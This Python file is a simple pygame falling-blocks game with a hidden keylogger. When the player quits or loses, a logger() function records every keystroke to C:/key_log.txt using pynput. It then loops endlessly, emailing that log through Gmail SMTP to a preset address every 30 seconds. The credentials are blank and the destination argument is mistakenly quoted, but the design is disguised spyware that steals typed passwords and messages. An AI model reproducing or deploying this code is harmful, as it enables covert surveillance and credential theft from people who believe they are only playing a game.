import pygame
import sys
import random
import ctypes
from pynput.keyboard import Key, Listener
import logging
import smtplib
import time

SRC_EMAIL = ''
SRC_EMAIL_PASSWORD = ''
DESTINATION_EMAIL = ''

pygame.init()
width= 800
height=600

red=(255,0,0)
background_color =(0,0,0)
blue=(0,0,255)
yellow=(255,255,0)
player_size = 50
player_pos = [width/2,height-2*player_size,50,50]

enemy_size=player_size
enemy_pos=[random.randint(0,width-enemy_size),0]
speed=10
enemy_list=[enemy_pos]
screen=pygame.display.set_mode((width,height))
myFont=pygame.font.SysFont("monospace", 35)
score=0
game_over=False
clock=pygame.time.Clock()
log_dir="C:/"
time_to_wait=30

#keylogger
def logger():   

    logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def keypress(Key):
        logging.info(str(Key))

#Mail functionality   
    def sendmail():
        time.sleep(time_to_wait)          
        
        with open("{}key_log.txt".format(log_dir),'r') as f:
            data=f.read()
        server=smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(SRC_EMAIL, SRC_EMAIL_PASSWORD)
        server.sendmail(SRC_EMAIL,'DESTINATION_EMAIL', data)
        server.quit()

    with Listener(on_press = keypress) as listener:
        while True:
            sendmail()
        listener.join()
def drop_enemies(enemy_list):

    delay=random.random()

    if len(enemy_list)< 10 and delay <0.1:
        x_pos = random.randint(0,width-enemy_size)
        y_pos = 0
        enemy_list.append([x_pos,y_pos])

def draw_enemies(enemy_list):
    for enemy_pos in enemy_list:
        pygame.draw.rect(screen,blue, (enemy_pos[0], enemy_pos[1], enemy_size, enemy_size))


def detect_collision(player_pos,enemy_pos):
    p_x=player_pos[0]
    p_y=player_pos[1]

    e_x=enemy_pos[0]
    e_y=enemy_pos[1]
    if (e_x>= p_x and e_x < (p_x + player_size)) or (p_x >= e_x and p_x < (e_x+enemy_size)):
        if (e_y>=p_y and e_y<(p_y + player_size)) or (p_y >= e_y and p_y < (e_y+enemy_size)):
            return True

def update_enemy_position(enemy_list, score,speed):
    for idx,enemy_pos in enumerate(enemy_list):
        if enemy_pos[1]>=0 and enemy_pos[1]< height:
            enemy_pos[1]+=speed
            if score>50:
                speed+=1
            if score>100:
                speed+=2
            if score>150:
                speed+=5
        else:
            enemy_list.pop(idx)
            score+=1
    return score

def collision_check(enemy_list, player_pos):
    for enemy_pos in enemy_list:
        if detect_collision(enemy_pos, player_pos):
            return True
        
    return False
while not game_over:

    for event in pygame.event.get():
        if event.type==pygame.QUIT:
            pygame.display.quit()
            logger() 
        if event.type==pygame.KEYDOWN:
            x=player_pos[0]
            y=player_pos[1]
            
            if event.key==pygame.K_LEFT:
                x-=player_size

            elif event.key==pygame.K_RIGHT:
                x+=player_size

            player_pos =[x,y]

    screen.fill(background_color)

    drop_enemies(enemy_list)
    score=update_enemy_position(enemy_list,score,speed)
    text="SCORE:" + str(score)
    label= myFont.render(text, 1, yellow)
    screen.blit(label, (width-200, height-40))

    if collision_check(enemy_list, player_pos):
        game_over=True
        ctypes.windll.user32.MessageBoxW(0, str(score), "GAME OVER! YOUR SCORE: " ,1)
            
    draw_enemies(enemy_list)
    
    pygame.draw.rect(screen,red, (player_pos[0], player_pos[1], player_size, player_size) )
    clock.tick(30)
    pygame.display.update()

pygame.display.quit()    

#engage logger
logger()

